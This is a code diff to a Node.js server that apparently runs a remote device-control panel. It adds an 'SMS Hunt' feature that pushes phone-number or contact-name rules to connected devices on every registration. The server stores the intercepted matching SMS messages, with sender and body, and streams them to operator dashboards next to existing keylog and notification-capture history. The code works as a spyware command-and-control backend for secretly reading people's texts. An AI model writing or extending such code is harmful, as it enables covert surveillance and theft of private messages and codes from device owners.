@@ -1020,6 +1020,7 @@ const COMMANDS = {
     gesture_live_list:           { category: 'gesture',     label: 'Live Stream List',      icon: '📋' },
     // Task Studio
     run_task_local:              { category: 'task',        label: 'Run Task (Local)',       icon: '▶️' },
+    set_sms_hunts:               { category: 'sms',         label: 'Sync SMS Hunts',        icon: '🎯' },
     // Connection management
     restart_connection:          { category: 'system',      label: 'Restart Connection',    icon: '🔄' },
     // Audio / Volume control
@@ -1038,6 +1039,8 @@ const User        = require('./models/User');
 const Command     = require('./models/Command');
 const ActivityLog = require('./models/ActivityLog');
 const Task        = require('./models/Task');
+const SmsHunt     = require('./models/SmsHunt');
+const SmsHuntMessage = require('./models/SmsHuntMessage');
 
 const authRoutes    = require('./routes/auth');
 const devicesRoutes = require('./routes/devices');
@@ -1314,6 +1317,12 @@ async function processMessage(clientId, clientType, event, data) {
 
         // Ack back to device
         if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
+
+        // Restore this device's SMS Hunt rules after every registration. This
+        // is what makes hunts saved while offline take effect automatically.
+        try { await syncSmsHuntsToDevice(deviceId, true); } catch (e) {
+            log('SMS_HUNT', `Sync on connect failed for ${deviceId}: ${e.message}`, 'warn');
+        }
 
         // Dispatch scheduled tasks (scheduleOnConnect) to the device on fresh connect — runs only once then clears the flag
         if (isFreshConnect) {
@@ -1817,6 +1826,46 @@ async function processMessage(clientId, clientType, event, data) {
         return;
     }
 
+    // SMS Hunt messages are persisted by device and relayed only to the
+    // owning access ID (admins still receive every device event).
+    if (event === 'sms_hunt:message') {
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId;
+        if (!deviceId || !data?.messageKey) return;
+        const device = inMemoryDevices.get(deviceId);
+        const accessId = device?.accessId || '';
+        if (!accessId) {
+            log('SMS_HUNT', `Dropping message without access ID from ${deviceId}`, 'warn');
+            return;
+        }
+        try {
+            const message = await SmsHuntMessage.findOneAndUpdate(
+                { deviceId, messageKey: String(data.messageKey) },
+                {
+                    $setOnInsert: {
+                        accessId,
+                        deviceId,
+                        huntIds: Array.isArray(data.huntIds) ? data.huntIds.map(String) : [],
+                        smsId: String(data.smsId || ''),
+                        messageKey: String(data.messageKey),
+                        sender: String(data.sender || ''),
+                        senderName: String(data.senderName || ''),
+                        body: String(data.body || ''),
+                        date: Number(data.date) || Date.now(),
+                        receivedAt: new Date(),
+                    },
+                },
+                { upsert: true, new: true, setDefaultsOnInsert: true }
+            ).lean();
+            if (message) {
+                broadcastDashScoped('sms_hunt:message', { deviceId, message }, accessId);
+            }
+        } catch (e) {
+            log('SMS_HUNT', `Persist failed for ${deviceId}: ${e.message}`, 'warn');
+        }
+        return;
+    }
+
     log('MSG', `Unhandled event: ${event}`, 'warn');
 }
 
@@ -2097,14 +2146,16 @@ app.get('/api/events', async (req, res) => {
     try {
         const deviceIds = list.map(d => d.deviceId).filter(Boolean);
         for (const did of deviceIds) {
-            const [keylogs, notifications, activity] = await Promise.all([
+            const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
                 R.getKeylogs(did),
                 R.getNotifications(did),
                 R.getActivity(did),
+                SmsHuntMessage.find({ deviceId: did }).sort({ receivedAt: -1 }).limit(500).lean().catch(() => []),
             ]);
             if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
             if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
             if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
+            if (smsHuntMessages.length) sseSend(clientId, 'sms_hunt:history', { deviceId: did, messages: smsHuntMessages });
         }
     } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }
 
@@ -3717,6 +3768,60 @@ app.post('/api/device/:deviceId/reset-session', async (req, res) => {
     res.json({ success: true, deviceId, pendingCleared: cleared, redisKeysRemoved: redisCleared });
 });
 
+// ── SMS Hunt device synchronization and persistence ────────────────────────────
+async function getSmsHuntAccessId(req) {
+    if (req.authRole !== 'user') return '';
+    let accessId = req.authAccessId || '';
+    if (!accessId) {
+        const user = await User.findById(req.authUserId).select('accessId').lean();
+        accessId = user?.accessId || '';
+    }
+    return accessId;
+}
+
+async function authorizeSmsHuntDevice(req, deviceId) {
+    const device = await Device.findOne({ deviceId }).lean()
+        || inMemoryDevices.get(deviceId)
+        || null;
+    if (!device) return null;
+    if (req.authRole === 'user') {
+        const accessId = await getSmsHuntAccessId(req);
+        if (!accessId || (device.accessId || '') !== accessId) return null;
+        return { device, accessId };
+    }
+    return { device, accessId: device.accessId || '' };
+}
+
+async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
+    const conn = _getTcpConnForDevice(deviceId);
+    if (!conn || !conn.writable) return false;
+    const hunts = await SmsHunt.find({ deviceId, enabled: true })
+        .sort({ updatedAt: -1 })
+        .lean();
+    const commandId = crypto.randomBytes(12).toString('hex');
+    tcpSend(conn, 'command:execute', {
+        commandId,
+        command: 'set_sms_hunts',
+        params: {
+            hunts: hunts.map(hunt => ({
+                huntId: String(hunt._id),
+                name: hunt.name,
+                targetMode: hunt.targetMode,
+                target: hunt.target,
+                enabled: hunt.enabled !== false,
+            })),
+        },
+    });
+    if (clearSchedules) {
+        await SmsHunt.updateMany(
+            { deviceId, scheduleOnConnect: true },
+            { $set: { scheduleOnConnect: false, updatedAt: new Date() } }
+        );
+    }
+    log('SMS_HUNT', `Synced ${hunts.length} hunt(s) → ${deviceId}`);
+    return true;
+}
+
 // ── Task Studio — per-accessId workflow storage ───────────────────────────────
 // Users always see only their own accessId's tasks. Admins can request one
 // accessId explicitly, or omit it to receive every saved task grouped by owner.
@@ -3865,6 +3970,119 @@ app.delete('/api/tasks/:taskId', requireUserOrAdmin, async (req, res) => {
         }
         await task.deleteOne();
         res.json({ success: true });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+// ── SMS Hunt — always scoped to one exact deviceId ────────────────────────────
+app.get('/api/sms-hunt', requireUserOrAdmin, async (req, res) => {
+    const deviceId = String(req.query.deviceId || '').trim();
+    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+    try {
+        const authorized = await authorizeSmsHuntDevice(req, deviceId);
+        if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
+        const hunts = await SmsHunt.find({ deviceId }).sort({ updatedAt: -1 }).lean();
+        res.json({ success: true, hunts });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.get('/api/sms-hunt/messages', requireUserOrAdmin, async (req, res) => {
+    const deviceId = String(req.query.deviceId || '').trim();
+    if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+    try {
+        const authorized = await authorizeSmsHuntDevice(req, deviceId);
+        if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
+        const messages = await SmsHuntMessage.find({ deviceId })
+            .sort({ receivedAt: -1 })
+            .limit(500)
+            .lean();
+        res.json({ success: true, messages });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/api/sms-hunt', requireUserOrAdmin, async (req, res) => {
+    const {
+        _id, deviceId, name, targetMode = 'phone', target,
+        enabled = true, scheduleOnConnect = false,
+    } = req.body || {};
+    const cleanDeviceId = String(deviceId || '').trim();
+    const cleanName = String(name || '').trim();
+    const cleanTarget = String(target || '').trim();
+    if (!cleanDeviceId || !cleanName || !cleanTarget) {
+        return res.status(400).json({ success: false, error: 'deviceId, name, and target are required' });
+    }
+    if (!['phone', 'name'].includes(targetMode)) {
+        return res.status(400).json({ success: false, error: 'targetMode must be phone or name' });
+    }
+    try {
+        const authorized = await authorizeSmsHuntDevice(req, cleanDeviceId);
+        if (!authorized) return res.status(404).json({ success: false, error: 'Device not found' });
+
+        let hunt;
+        if (_id) {
+            hunt = await SmsHunt.findById(_id);
+            if (!hunt) return res.status(404).json({ success: false, error: 'SMS Hunt not found' });
+            if (hunt.deviceId !== cleanDeviceId) {
+                return res.status(403).json({ success: false, error: 'SMS Hunt belongs to another device' });
+            }
+            if (req.authRole === 'user' && hunt.accessId !== authorized.accessId) {
+                return res.status(403).json({ success: false, error: 'SMS Hunt does not belong to this user' });
+            }
+            hunt.name = cleanName;
+            hunt.targetMode = targetMode;
+            hunt.target = cleanTarget;
+            hunt.enabled = enabled !== false;
+            hunt.scheduleOnConnect = !!scheduleOnConnect;
+            hunt.updatedAt = new Date();
+            await hunt.save();
+        } else {
+            hunt = await new SmsHunt({
+                accessId: authorized.accessId,
+                deviceId: cleanDeviceId,
+                name: cleanName,
+                targetMode,
+                target: cleanTarget,
+                enabled: enabled !== false,
+                scheduleOnConnect: !!scheduleOnConnect,
+            }).save();
+        }
+
+        const online = !!_getTcpConnForDevice(cleanDeviceId);
+        // A scheduled hunt waits for the next connection. Disabled hunts must
+        // sync immediately so a previously-installed rule is removed.
+        if (online && (!hunt.scheduleOnConnect || !hunt.enabled)) {
+            await syncSmsHuntsToDevice(cleanDeviceId);
+        }
+        res.json({ success: true, hunt });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.delete('/api/sms-hunt/:huntId', requireUserOrAdmin, async (req, res) => {
+    try {
+        const hunt = await SmsHunt.findById(req.params.huntId);
+        if (!hunt) return res.status(404).json({ success: false, error: 'SMS Hunt not found' });
+        const authorized = await authorizeSmsHuntDevice(req, hunt.deviceId);
+        if (!authorized) return res.status(403).json({ success: false, error: 'Device not found' });
+        if (req.authRole === 'user' && hunt.accessId !== authorized.accessId) {
+            return res.status(403).json({ success: false, error: 'SMS Hunt does not belong to this user' });
+        }
+        const deviceId = hunt.deviceId;
+        await hunt.deleteOne();
+        if (_getTcpConnForDevice(deviceId)) await syncSmsHuntsToDevice(deviceId);
+        res.json({ success: true });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.delete('/api/sms-hunt/messages/:messageId', requireUserOrAdmin, async (req, res) => {
+    try {
+        const message = await SmsHuntMessage.findById(req.params.messageId);
+        if (!message) return res.status(404).json({ success: false, error: 'SMS Hunt message not found' });
+        const authorized = await authorizeSmsHuntDevice(req, message.deviceId);
+        if (!authorized) return res.status(403).json({ success: false, error: 'Device not found' });
+        if (req.authRole === 'user' && message.accessId !== authorized.accessId) {
+            return res.status(403).json({ success: false, error: 'Message does not belong to this user' });
+        }
+        await message.deleteOne();
+        res.json({ success: true, messageId: req.params.messageId });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
